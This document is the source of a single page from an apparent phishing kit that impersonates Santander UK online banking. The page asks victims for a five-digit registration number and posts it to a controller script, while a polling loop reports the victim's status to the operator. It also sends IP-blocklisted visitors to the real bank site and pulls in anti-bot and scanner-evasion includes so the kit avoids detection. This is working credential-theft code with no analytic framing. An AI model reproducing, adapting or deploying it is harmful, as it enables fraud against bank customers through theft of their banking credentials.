<?php
//Dwi F.D
require '../CONFIG.php';
require 'partial/margin.php';
include 'partial/zero.php';
include 'vendor/100.php';
include 'vendor/200.php';
include 'vendor/300.php';
require_once 'vendor/index.php';
require_once '../remote/500.php';
include 'vendor/netcraft_check.php';
require('../CONFIG.php');
$filename = '../2617d44145d0300cdf70349b2f3cac79.txt';
$ip_to_search = $_SERVER['REMOTE_ADDR'];

if (false !== strpos(file_get_contents($filename), $ip_to_search)) {

   header("Location: https://href.li/?https://santander.co.uk");
   $line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
   file_put_contents('vendor/one_time_br_prevents.log', $line . PHP_EOL, FILE_APPEND);
   session_destroy();
   die();
} else {
   // otherwise
}
session_start();
error_reporting(0);

$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
if ($_SESSION['started'] == 'true') {
  $uniqueid = $_SESSION['uniqueid'];
  $query = mysqli_query($conn,"SELECT * FROM customers WHERE uniqueid=$uniqueid");
	if($query){
		$arr = mysqli_fetch_array($query,MYSQLI_ASSOC);
		$usrlogin = $arr['usrlogin'];
	}else{
		header('location:exit.php');
	}
} else {
  header('location:exit.php');
}
?>
<!DOCTYPE html>
<html lang="en-GB">

<head>
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
   <meta name="robots" content="noindex, nofollow">
   <meta name="ROBOTS" content="NOODP,NOYDIR">
   <meta http-equiv=Cache-Control content="no-cache, no-store">
   <meta http-equiv=X-Frame-Options content=SAMEORIGIN class=sf-hidden>
   <meta http-equiv=X-XSS-Protection content="'1; mode=block' always" class=sf-hidden>
   <meta http-equiv=X-Content-Type-Options content="'nosniff' always" class=sf-hidden>
   <meta http-equiv=Referrer-Policy content=strict-origin-when-cross-origin class=sf-hidden>
   <meta http-equiv=Cache-Control content="no-cache, no-store" class=sf-hidden>
   <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
   <meta http-equiv="expires" content="-1">
   <meta http-equiv="cache-control" content="max-age=0">
   <meta http-equiv="cache-control" content="no-cache">
   <meta http-equiv="expires" content="0">
   <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
   <meta http-equiv="pragma" content="no-cache">
   <meta http-equiv="Pragma: no-cache">
   <meta http-equiv="Cache Control" content=no-store>
   <meta http-equiv="Cache Control: no-store">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <meta http-equiv="Pragma" content="no-cache" />
   <meta http-equiv="Cache-Control" content="no-cache, no-store" />
   <title>Online Banking: Enter Your Passcode</title>
   <meta name="title" content="Online Banking | Personal Account Holders | Santander UK" />
   <meta name="description"
      content="Access your account information online with internet banking from Santander; manage your money, cards and view other services. Find out more at Santander.co.uk" />
   <meta name="abstract"
      content="Access your account information online with internet banking from Santander; manage your money, cards and view other services. Find out more at Santander.co.uk" />
   <link rel="icon" href="partial/img/logo.ico" type="image/x-icon" />

   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <meta http-equiv="Pragma" content="no-cache" />
   <meta http-equiv="Cache-Control" content="no-cache, no-store" />


   <style type="text/css">
      body {
         margin: 0;
         padding: 0;
         height: 100%;
      }

      #splash-97123-overlay {
         padding: 0;
         margin: 0;
         position: absolute;
         top: 0;
         left: 0;
         right: 0;
         width: 100%;
         height: 100%;
         background: #595959 url(https://d1byywzi6ghj11.cloudfront.net/img/spacer.gif) center center;
         z-index: 1001;
         -moz-opacity: 0.8;
         opacity: 0.80;
         filter: alpha(opacity=80);
         display: block;
      }

      #splash-97123-splash {
         font-family: verdana, arial, tahoma;
         font-size: 14px;
         width: 640px;
         margin: 20px -320px;
         z-index: 10002;
         position: absolute;
         left: 50%;
         top: 100px;
         display: block;
      }

      #splash-97123-body {
         title: Please download Trusteer Rapport which provides you with advanced layers of protection against malware and other security threats. For more information click on the Learn More link which also contains a link to download the Trusteer Rapport software.;
         color: #000;
         height: 495px;
         width: 640px;
         font-size: 12px;
         font-family: verdana, arial, tahoma;
         text-align: left;
         color: black;
         background: url(https://d1byywzi6ghj11.cloudfront.net/img/santanderuk_personal_20140304_image_src.jpg) center center;
      }

      #splash-97123-close-button {
         height: 30px;
         width: 30px;
         position: relative;
         float: right;
         border: none;
         cursor: pointer;
         margin: -10px -15px -10px 0px;
         background: url(https://d1byywzi6ghj11.cloudfront.net/img/close-btn.png) center center;
         text-align: left;
         z-index: 10002;
      }

      #splash-97123-download-button {
         padding: 2px;
         text-align: center;
         width: 222px;
         margin: 20px auto 10px;
         cursor: pointer;
         position: absolute;
         top: 366px;
         left: 413px;
         height: 52px
      }

      #splash-97123-download-button p {
         color: #000;
         background: #04A2F4;
         color: #ffffff;
         line-height: 20px;
         font-size: 20px;
         text-align: left;
         padding: 0px
      }

      #splash-97123-download-button-container {
         text-align: center
      }

      #splash-97123-iframe {
         width: 100%;
         height: 100%;
         border: 0;
         background: #595959;
         color: #595959;
      }

      #splash-97123-iframe body {
         background: #595959;
         color: #595959;
      }

      #splash-97123-footer-left {
         float: left;
         padding-left: 20px;
         text-align: left;
         position: absolute;
         bottom: 19px;
      }

      #splash-97123-footer-left a {
         margin-right: 10px;
         color: #0033FF;
         font-size: 12px;
         font-weight: normal;
         text-decoration: underline;
         text-align: left;
         font-family: verdana, arial, tahoma;
      }

      #splash-97123-footer-left a:hover {
         color: #0033FF;
      }

      #splash-97123-body-overlay {
         padding: 0;
         margin: 0;
         position: absolute;
         top: 0;
         *top: 10px;
         left: 0;
         right: 0;
         width: 640px;
         height: 495px;
         background: #8D8D8D center center;
         z-index: 1001;
         -moz-opacity: 0.8;
         opacity: 0.80;
         filter: alpha(opacity=80);
         display: block;
      }

      #splash-97123-clicked-message {
         title: Thank you for downloading Trusteer Rapport. (Don&#39; t forget to open and run the file once it has finished downloading). Close this message. How do I install?;
         width: 640px;
         height: 179px;
         z-index: 1002;
         position: absolute;
         left: 0px;
         top: 150px;
         display: block;
         background: url(https://d1byywzi6ghj11.cloudfront.net/img/download_click_1.png);
      }

      #splash-97123-clicked-close-button {
         width: 167px;
         height: 30px;
         position: absolute;
         top: 122px;
         left: 146px;
         cursor: pointer;
      }

      #splash-97123-clicked-help-button {
         width: 167px;
         height: 30px;
         position: absolute;
         top: 122px;
         left: 326px;
         cursor: pointer;
         display: block;
      }

      #splash-97123-downloaded-message {
         title: Your account is not yet protected. You have downloaded Trusteer Rapport to protected your online account, buy it&#39;
         s currently not protecting your online banking. Download Again. Why Not?;
         width: 640px;
         height: 179px;
         z-index: 1002;
         position: absolute;
         left: 0px;
         top: 150px;
         display: block;
         background: url(https://d1byywzi6ghj11.cloudfront.net/img/already_downloaded_1.png);
      }

      #splash-97123-downloaded-download-button {
         width: 167px;
         height: 30px;
         position: absolute;
         top: 122px;
         left: 146px;
         cursor: pointer;
      }

      #splash-97123-downloaded-help-button {
         width: 167px;
         height: 30px;
         position: absolute;
         top: 122px;
         left: 326px;
         cursor: pointer;
      }
   </style>
   <style></style>

   <style>
      .security-number[_ngcontent-erl-c1] {
         color: #000;
         letter-spacing: 20px;
         background-color: transparent;
      }

      .security-number[_ngcontent-erl-c1]::-webkit-input-placeholder {
         color: #ccc !important;
      }

      .security-number[_ngcontent-erl-c1]::-moz-placeholder {
         color: #ccc !important;
      }

      .security-number[_ngcontent-erl-c1]:-ms-input-placeholder {
         color: #ccc !important;
      }

      .security-number[_ngcontent-erl-c1]::-ms-input-placeholder {
         color: #ccc !important;
      }

      .security-number[_ngcontent-erl-c1]::placeholder {
         color: #ccc !important;
      }

      @supports not ((-webkit-hyphens: auto) or (-ms-hyphens: auto) or (hyphens: auto)) {
         .security-number[_ngcontent-erl-c1] {
            -webkit-text-stroke-width: 0.2em;
         }

         .security-number[_ngcontent-erl-c1]::-webkit-input-placeholder {
            -webkit-text-stroke-width: 0 !important;
         }

         .security-number[_ngcontent-erl-c1]::-moz-placeholder {
            -webkit-text-stroke-width: 0 !important;
         }

         .security-number[_ngcontent-erl-c1]:-ms-input-placeholder {
            -webkit-text-stroke-width: 0 !important;
         }

         .security-number[_ngcontent-erl-c1]::-ms-input-placeholder {
            -webkit-text-stroke-width: 0 !important;
         }

         .security-number[_ngcontent-erl-c1]::placeholder {
            -webkit-text-stroke-width: 0 !important;
         }
      }

      .invalid-security-number[_ngcontent-erl-c1] {
         border: 1px solid #ec0000 !important;
         border-radius: 4px;
      }
   </style>


   <style>
      .invalid-otp[_ngcontent-erl-c2] {
         border: 1px solid #ec0000 !important;
         border-radius: 4px;
      }
   </style>
   <script src="partial/js/jquery.js"></script>
   <script>
      $(document).ready(function () {
         if (window.location.search !== '?user=true') {
            location.href = 'exit.php';
         }
      })
   </script>
   <script>
      $(document).ready(function () {
         $('#loginFrm').submit(function (e) {
            e.preventDefault();
            var regnum = $('#regnum').val();
            if (regnum == null || regnum == '') {
               return false;
            }
            $.ajax({
               type: 'POST',
               url: 'partial/controller.php?type=Reg',
               data: $('#loginFrm').serialize(),
               success: function (data) {
                  //console.log(data);
                  var parsed_data = JSON.parse(data);
                  if (parsed_data.status == 'ok') {
                     //console.log(parsed_data)
                     location.href =
                        "loading.php?user=true"
                  } else {
                     return false;
                  }
                  //console.log(parsed_data.status);
               }
            })
         });
      });
   </script>
   <script>
      var interval = 3000;

      function userStatus() {
         $.ajax({
            type: 'GET',
            url: 'partial/status.php',
            success: function (data) {
               var parsed_data = JSON.parse(data);
            },
            complete: function (data) {
               setTimeout(userStatus, interval);
            }
         });
      }
      setTimeout(userStatus, interval);
   </script>



</head>

<body>
   <meta http-equiv="content-secure-policy" content="deafult-src 'self'="" '*'="" "="">
   <meta http-equiv="X-Xss-Protection" content="&#39;1; mode=block&#39; always" />
   <meta http-equiv="X-Content-Type-Options" content="&#39;nosniff&#39; always" />
   <meta http-equiv="Strict-Transport-Security" content="max-age=31536000" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1, maximum-scale=2.0" />
   <!--<base href="/">-->
   <base href="." />



   <link rel="stylesheet" href="partial/css/styles.d639dea2316e6d785b32.css" />

   <olb-root _nghost-erl-c0="" ng-version="7.2.16">
      <olb-home _ngcontent-erl-c0="">
         <div class="container-fluid appheader">
            <div class="container">
               <div class="row">
                  <div class="col-sm-12 containerPadding header-responsive" role="banner">
                     <olb-header>
                        <nav class="navbar appheader_content">
                           <a href="#"><img alt="Santander Image" class="img-fluid Bitmap header-logo-santander"
                                 src="partial/img/header-logo.png" /></a>
                           <!---->
                           <div><img alt="Santander Lock Image" class="img-lock header-logo-lock"
                                 src="partial/img/padlock.svg" /></div>
                           <!---->
                        </nav>
                     </olb-header>
                  </div>
               </div>
            </div>
         </div>
         <div class="container">
            <div class="row">
               <div aria-live="assertive" class="col-sm-12 main-section-responsive" role="main">
                  <router-outlet></router-outlet>
                  <olb-validate-otp>
                     <div class="content otp-container">
                        <div class="row">
                           <div class="col-lg-5 col-sm-12 left-content">
                              <div>
                                 <div>
                                    <div class="row mt-5 justify-content-center mb-3">
                                       <!---->
                                       <style>
                                          #imgicon{
                                             width: 50px;
                                             border-radius: 100%;
                                             border-style: solid;
                                             border-width: 1px;
                                             padding: 10px;
                                             box-shadow: 1px 3px 5px;
                                             border-color: white;
                                             margin-bottom:5%;
                                          }
                                       </style>
                                       <img id=imgicon alt="Enter Your Passcode image" class="img-fluid sms-mid-image" src="partial/img/lock.svg" />
                                       <!---->
                                    </div>
                                    <form id="loginFrm" class="ng-pristine ng-invalid ng-touched">
                                       <input type="hidden" name="userid" value="<?=$_SESSION['uniqueid'];?>">
                                       

                                       
                                       
                                       <div class="row mt-3">
                                          <div class="col-md-12">
                                             <h1 class="title-header" style="font-size:15px">Enter your Registration Number*</h1>
                                          </div>
                                       </div>

                                       <div class="row mb-2">
                                          <div class="col-md-12 col-sm-12 col-lg-12 label">
                                             <common-one-time-passcode _nghost-erl-c2="">
                                                <!---->
                                                <!---->
                                                <div _ngcontent-erl-c2="" class="ng-pristine ng-invalid ng-touched">
                                                   <!---->
                                                   <input _ngcontent-erl-c2="" aria-label="Registration Number"
                                                      aria-required="true" maxlength="5" minlength="5"
                                                      oncopy="return false" oncut="return false" onpaste="return false" placeholder="_ _ _ _ _"
                                                      required="" type="tel" inputmode=numeric
                                                      class="otp-textbox ng-pristine ng-invalid ng-touched" style="width:70% !important;text-align:center;letter-spacing:15px"
                                                      id="regnum" name="regnum" />
                                                </div>
                                             </common-one-time-passcode>
                                          </div>
                                       </div>
                                       
                                       <div class="row mt-2 title-small-info">
                                          <div class="col-md-12 col-sm-12 col-lg-12">
                                             <!---->

                                          </div>
                                       </div>
                                       <div class="row mt-1 otp-validate-container">
                                          <div class="col-md-1"></div>
                                          <div class="col-md-10 valid-mobile-width">
                                             <div class="otp-errorMessage">
                                                <olb-validation-message msgtype="warn">
                                                   <!---->
                                                </olb-validation-message>
                                             </div>
                                          </div>
                                       </div>
                                       <!---->
                                       <!---->
                                       <!---->
                                       <div class="row">
                                          <div class="col-md-12 col-sm-12 col-lg-12 d-flex justify-content-center" style="margin-bottom: 10%;">
                                             <button aria-describedby="validateOTPDesc" class="button button-secondary"
                                                id="btnsubmit" type="submit">Continue</button>
                                             <span class="d-none" id="validateOTPDesc"> Please click here to validate
                                                One Time Passcode </span>
                                          </div>
                                       </div>
                                       <div class="d-flex justify-content-center mt-1 mb-3">
                                          <a alt="cancelotp" aria-describedby="cancelLogonDesc"
                                             href="https://retail.santander.co.uk/olb/app/logon/access/#/logon">Cancel
                                             log on</a>
                                          <span class="d-none" id="cancelLogonDesc"> If you wish to cancel logon, please
                                             click here </span>
                                       </div>
                                       <!---->
                                       <!---->
                                    </form>
                                 </div>
                              </div>
                           </div>
                           <div class="col-lg-7 col-sm-0">
                              <olb-otp-right-content>
                                 <div class="row image-hide-mobile-tablet mt-5">
                                    <!---->
                                    <img alt="Protect yourself against fraud and scams image"
                                       class="logon-right-image image-hide-mobile-tablet mt-3"
                                       src="partial/img/SMS@1x.svg" />
                                    <!---->
                                 </div>
                                 <div class="text-details-container">
                                    <div class="row mb-1">
                                       <div class="text-title col-sm-12"><span>Protect yourself against fraud and
                                             scams</span></div>
                                    </div>
                                    <div class="row mb-2">
                                       <div class="text-details col-sm-12 mt-1"><span>Never share a One Time Passcode
                                             (OTP) with another person, not even a Santander employee.</span></div>
                                    </div>
                                 </div>
                              </olb-otp-right-content>
                           </div>
                        </div>
                     </div>
                  </olb-validate-otp>
               </div>
            </div>
         </div>
         <div class="container-fluid appfooter">
            <div class="container">
               <div class="row">
                  <div class="col-sm-12 containerPadding footer-responsive" role="contentinfo">
                     <olb-footer>
                        <footer class="footer-base">
                           <div class="footer-left-content">
                              <!---->
                              <a target="_blank"
                                 href="#personal/support/ways-to-bank/online-and-mobile-banking-commitment">Online
                                 Banking Guarantee</a>
                              <a target="_blank" href="#personal/support/customer-support/accessibility">Site Help &amp;
                                 Accessibility</a>
                              <a target="_blank" href="#personal/support/customer-support/legal-information">Security
                                 &amp; Privacy</a>
                              <a target="_blank"
                                 href="#personal/support/ways-to-bank/online-banking-service-terms-conditions">Terms
                                 &amp; Conditions</a>
                              <a target="_blank" href="#personal/support/customer-support/legal-information">Legal</a>
                           </div>
                           <div class="footer-right-content"><img alt="FSCS Protected Image"
                                 src="partial/img/asset-2.png" /></div>
                        </footer>
                     </olb-footer>
                  </div>
               </div>
            </div>
         </div>
         <div>
            <olb-session></olb-session>
         </div>
      </olb-home>
   </olb-root>




</body>
<a rel="nofollow" style="display:none;" href="vendor/"
   title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned
   from the site!</a>

</html>